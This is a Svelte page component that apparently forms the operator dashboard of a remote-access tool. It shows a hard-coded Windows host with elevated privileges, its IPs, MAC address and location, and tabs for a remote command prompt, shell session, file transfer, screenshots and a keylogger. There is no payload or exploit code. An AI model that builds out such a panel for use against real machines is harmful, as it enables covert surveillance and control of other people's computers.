<script lang="ts">
	import { onMount, onDestroy } from 'svelte';
	import DeviceHeader from '$lib/components/device/DeviceHeader.svelte';
	import DeviceInfo from '$lib/components/device/DeviceInfo.svelte';
	import DeviceTabs from '$lib/components/device/DeviceTabs.svelte';
	import CommandPromptTab from '$lib/components/device/tabs/CommandPromptTab.svelte';
	import ShellSessionTab from '$lib/components/device/tabs/ShellSessionTab.svelte';
	import FileTransferTab from '$lib/components/device/tabs/FileTransferTab.svelte';
	import ScreenshotsTab from '$lib/components/device/tabs/ScreenshotsTab.svelte';
	import KeyloggerTab from '$lib/components/device/tabs/KeyloggerTab.svelte';
	import LogsTab from '$lib/components/device/tabs/LogsTab.svelte';
	import { createDeviceSocket, type DeviceSocketState } from '$lib/stores/deviceSocket';
	import type { Device } from '$lib/types';

	// ── Device data (replace with real load()) ────────────────────────────
	const device: Device = {
		name: 'DESKTOP-WIN10-01',
		status: 'online' as const,
		elevated: true,
        device_id: "0a27e921-6c46-4aec-9e84-835014ca1f22",
		id: 'DEV-1-SWJ65P',
		hostname: 'DESKTOP-WIN10-01',
		username: 'admin',
		programId: 'PROG-001',
		internalIp: '192.168.1.101',
		externalIp: '203.0.113.45',
		macAddress: 'A4:B5:C6:D7:E8:F9',
		os: 'Windows 10 Pro',
		architecture: 'x64',
		cpu: 'Intel Core i7-10700',
		cores: 8,
		ram: '16 GB',
		disk: '512 GB SSD',
		country: 'US',
		city: 'New York',
		timezone: 'America/New_York',
		firstSeen: '2026-01-15 09:21:44',
		lastSeen: '2026-03-27 10:04:26'
	};

	// ── WebSocket ─────────────────────────────────────────────────────────
	let socket: ReturnType<typeof createDeviceSocket>;
    let state: DeviceSocketState = {
        connected: false,
        deviceOnline: false,
        error: null
    };

	onMount(() => {
		socket = createDeviceSocket(device.device_id);

		const unsubscribe = socket.subscribe((s) => {
			state = s;
		});

		onDestroy(() => {
			unsubscribe();
			socket?.destroy();
		});
	});

	onDestroy(() => {
		socket?.destroy();
	});

	// ── Tabs ──────────────────────────────────────────────────────────────
	type Tab =
		| 'command-prompt'
		| 'shell-session'
		| 'file-transfer'
		| 'screenshots'
		| 'keylogger'
		| 'logs';
	let activeTab: Tab = 'command-prompt';

	const tabs: { id: Tab; label: string }[] = [
		{ id: 'command-prompt', label: 'Command Prompt' },
		{ id: 'shell-session', label: 'Shell Session' },
		{ id: 'file-transfer', label: 'File Transfer' },
		{ id: 'screenshots', label: 'Screenshots' },
		{ id: 'keylogger', label: 'Keylogger' },
		{ id: 'logs', label: 'Logs' }
	];
</script>

<div class="device-page">
	<DeviceHeader
		name={device.name}
		status={state.deviceOnline ? 'online' : 'offline'}
		elevated={device.elevated}
		deviceId={device.id}
	/>

	<DeviceInfo {device} />

	<DeviceTabs {tabs} bind:activeTab />

	<div class="tab-content">
		{#if activeTab === 'command-prompt'}
			<CommandPromptTab {socket} />
		{:else if activeTab === 'shell-session'}
			<ShellSessionTab {socket} />
		{:else if activeTab === 'file-transfer'}
			<FileTransferTab />
		{:else if activeTab === 'screenshots'}
			<ScreenshotsTab {socket} />
		{:else if activeTab === 'keylogger'}
			<KeyloggerTab {socket} />
		{:else if activeTab === 'logs'}
			<LogsTab />
		{/if}
	</div>
</div>

<style lang="scss">
	@use '$lib/styles/variables' as *;

	.device-page {
		display: flex;
		flex-direction: column;
		gap: 16px;
		padding: 24px;
		min-height: 100vh;
		background: $bg-main;
	}

	.tab-content {
		background: $bg-card;
		border: 1px solid $border;
		border-radius: $radius;
		overflow: hidden;
	}
</style>
